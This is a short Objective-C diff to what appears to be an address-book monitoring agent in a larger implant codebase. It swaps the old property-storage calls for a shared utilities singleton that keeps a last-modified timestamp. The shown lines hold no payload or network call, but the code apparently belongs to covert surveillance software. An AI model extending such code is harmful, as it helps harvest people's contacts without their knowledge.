@@ -12,6 +12,7 @@
 #import <pwd.h>
 
 #import "RCSIAgentAddressBook.h"
+#import "RCSIUtils.h"
 
 //#define DEBUG
 
@@ -116,12 +117,14 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   NSNumber *number = [[NSNumber alloc] initWithDouble: mLastABDateTime];
   NSDictionary *abDict      = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: number, nil]
                                                             forKeys: [NSArray arrayWithObjects: @"AB_LASTMODIFIED", nil]];
-  NSDictionary *agentDict   = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: abDict, nil]
-                                                            forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
+//  NSDictionary *agentDict   = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: abDict, nil]
+//                                                            forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
   
-  setRcsPropertyWithName([[self class] description], agentDict);
+  //setRcsPropertyWithName([[self class] description], agentDict);
+  [[_i_Utils sharedInstance] setPropertyWithName:[[self class] description]
+                                  withDictionary:abDict];
   
-  [agentDict release];
+//  [agentDict release];
   [abDict release];
   [number release]; 
   [pool release];
@@ -135,7 +138,8 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  agentDict = rcsPropertyWithName([[self class] description]);
+  //agentDict = rcsPropertyWithName([[self class] description]);
+  agentDict = [[_i_Utils sharedInstance] getPropertyWithName:[[self class] description]];
   
   if (agentDict == nil) 
     {
